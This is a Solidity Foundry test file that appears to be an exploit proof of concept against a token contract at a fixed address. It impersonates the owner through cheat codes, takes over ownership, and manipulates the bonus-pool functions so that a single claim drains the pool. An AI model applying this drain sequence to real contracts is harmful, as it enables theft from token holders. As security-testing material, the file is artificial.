// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyCoinToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setBounsTime(uint256 timestamp) external;
    function balanceOf(address account) external view returns (uint256);
    function getDays() external view returns(string memory, string memory);
    function sumTheBounsPool(string memory yesToday, string memory twoYesToday) external;
    function sumBounsPiece(string memory yesToday, uint256 num) external returns(bool);
    function receiveBounsToken() external returns(uint256);
    function decimals() external pure returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);
    IMyCoinToken private target;
    address private realOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMyCoinToken(TARGET);

        // Get original owner from storage slot 0
        realOwner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(0))))));

        // Impersonate original owner to transfer ownership to attacker
        vm.prank(realOwner);
        target.transferOwnership(attacker);

        // Seed contract with tokens to create a bonus pool
        deal(TARGET, TARGET, 1_000_000 * 1e9);

        // Seed attacker with minimum tokens required to claim bonus (making balancePiece = 1)
        uint256 minBounsJoin = 1e20;
        deal(TARGET, attacker, minBounsJoin);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A).balanceOf(address(this));
        // As the new owner, attacker enables bonus claiming by setting the time to the past.
        target.setBounsTime(1);

        // Get date strings for the exploit.
        (string memory yesToday, string memory twoYesToday) = target.getDays();

        // Record the contract's balance before creating the pool.
        uint256 contractBalance = target.balanceOf(TARGET);

        // Create yesterday's bonus pool. This moves half the contract's balance.
        target.sumTheBounsPool(yesToday, twoYesToday);

        // This is the amount now in the bonus pool.
        uint256 poolAmount = contractBalance / 2;

        // We want to set dayPoolBounsPiece to poolAmount. The function calculates it as num * 10**decimals.
        // So, num = poolAmount / 10**decimals.
        uint256 num = poolAmount / (10**uint256(target.decimals()));

        // Set the manipulated reward piece value.
        target.sumBounsPiece(yesToday, num);

        // Claim the entire bonus pool.
        target.receiveBounsToken();
        uint256 finalBalance = IERC20(0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

